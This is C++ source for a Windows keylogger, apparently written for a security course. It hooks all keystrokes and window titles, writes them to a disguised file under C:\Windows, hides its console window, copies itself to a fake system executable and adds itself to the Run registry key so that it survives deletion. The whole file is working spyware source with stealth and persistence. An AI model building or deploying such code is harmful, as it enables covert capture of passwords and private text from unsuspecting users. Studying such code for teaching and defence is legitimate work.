// CYBR4450-KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// System Hook
HHOOK _hook;

static const char *path = "c:\\Windows\\windows.txt";

extern char lastwindow[256] = {};

extern char buffer[300] = {};

DWORD startTime;
std::string GetWindowInformation() 
{
	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256] = {};

		GetWindowTextA(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			char windowBuffer[200] = {};
			sprintf(windowBuffer, "\n\n[Window: %s - at %s] ", window_title, s);

			return windowBuffer;
		}
		return "";
	}
}

void WriteBuffer(int len) 
{
	FILE *file = fopen(path, "a+");
	fprintf(file, "%s", buffer);
	fclose(file);
	memset(buffer, '\0', sizeof(char) * len);
}

BOOL keyDown(int key) 
{
	return (GetAsyncKeyState(key) & 0x8000) != 0;
}

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode >= HC_ACTION)
    {
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) 
		{
			DWORD endTime = GetTickCount();

			if ((endTime - startTime) / 1000 >= 10) {
				std::cout << "WRITING BEEN 10 SECONDS" << std::endl;
				WriteBuffer(strlen(buffer));
				startTime = GetTickCount();
			}

			// Write if the buffer gets over a specified size
			int len = strlen(buffer);
			if (len >= 200) 
			{
				WriteBuffer(len);
			}
			std::string window = GetWindowInformation();
			strcat(buffer, window.c_str());

			BYTE keyState[256] = {};
			WORD chars;
			KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
			GetKeyState(0);
			GetKeyboardState(keyState);
			if (ToAscii(key->vkCode, key->scanCode, keyState, &chars, 0))
			{
				std::string toWrite = "";
				switch ((unsigned char)chars)
				{
				case '\b':
					toWrite = "[BACKSPACE]";
					break;
				case '\r':
					toWrite = "\n";
					break;
				default:
					toWrite = chars;
				}
				std::cout << toWrite.c_str();
				strcat(buffer, toWrite.c_str());
			}
		}

    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, _T("Failed to install hook!"), _T("Error"), MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwRegType = REG_SZ;
    wchar_t szPathToExe[MAX_PATH] = {};
    DWORD dwSize = sizeof(szPathToExe);

    lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
        fSuccess = (lResult == 0);
    }

    if (fSuccess)
    {
        fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    wchar_t szValue[count] = {};


    wcscpy_s(szValue, count, L"\"");
    wcscat_s(szValue, count, pathToExe);
    wcscat_s(szValue, count, L"\" ");

    if (args != NULL)
    {
        // caller should make sure "args" is quoted if any single argument has a space
        // e.g. (L"-name \"Mark Voidale\"");
        wcscat_s(szValue, count, args);
    }

    lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (wcslen(szValue) + 1) * 2;
        lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

void RegisterProgram()
{
    wchar_t szPathToExe[MAX_PATH];

    GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
    RegisterMyProgramForStartup(L"KeyLogger", L"c:\\Windows\\windows_proc.exe", L"-foobar");
}

int main()
{

	// Copies over file for later use so even if they delete the keylogger from their downloads, it won't matter :)
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);

	char command[MAX_PATH + 50];
	sprintf(command, "copy /y %s c:\\Windows\\windows_proc.exe > NUL", buffer, buffer);

	system(command);

	if (IsMyProgramRegisteredForStartup(L"KeyLogger") == false)
		RegisterProgram();

	std::cout << buffer << std::endl;

    startTime = GetTickCount();

    // visibility of window
    Stealth();

    // Set the hook
    SetHook();

    // loop to keep the console application running.
    MSG msg;
	while (GetMessage(&msg, NULL, 0, 0));
}
